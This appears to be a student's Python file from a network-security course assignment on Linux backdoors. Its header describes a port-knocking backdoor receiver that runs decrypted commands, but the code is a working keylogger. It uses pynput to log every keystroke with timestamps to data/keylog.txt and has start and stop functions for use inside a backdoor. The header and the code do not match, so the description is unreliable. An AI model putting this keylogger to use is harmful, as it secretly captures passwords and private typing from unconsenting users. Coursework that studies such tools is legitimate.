#!/usr/bin/env python3

"""
----------------------------------------------------------------------------------------------------
COMP 8505 BTech Network Security & Applications Development
Assignment 3:
    - To become familiar with packet sniffing backdoors and to implement Linux backdoors.
Student:
    - Hung Yu (Angus) Lin, A01034410, Set 7J
----------------------------------------------------------------------------------------------------
receiver.py
    - Contains a packet sniffing backdoor that listens for port-knocking on 3 ports in a specific order.
    - If port-knocking successful, decrypt the payload from the last packet and execute the command and.
      save the output. Then start a TCP connection to the sender and return the payload.
----------------------------------------------------------------------------------------------------
"""
import pynput.keyboard
from pynput.keyboard import Key, Listener
import logging


def on_press(key):
    logging.info(str(key))


keylogger_active = False
keylogger_log_path = "data/keylog.txt"
logging.basicConfig(filename=keylogger_log_path, level=logging.DEBUG, format=" %(asctime)s - %(message)s")
listener = Listener(on_press=on_press)


def start_keylogger():
    global listener
    global keylogger_active

    if keylogger_active:
        print("Keylogger already started.")
        return

    listener.start()
    keylogger_active = True
    print("Keylogger started.")
    # with Listener(on_press=on_press) as listener:
    #     listener.join()
    #     listener.stop()


def stop_keylogger():
    global listener
    global keylogger_active

    if not keylogger_active:
        print("Keylogger already stopped.")
        return keylogger_log_path

    listener.stop()
    keylogger_active = False
    print("Keylogger stopped.")

    return keylogger_log_path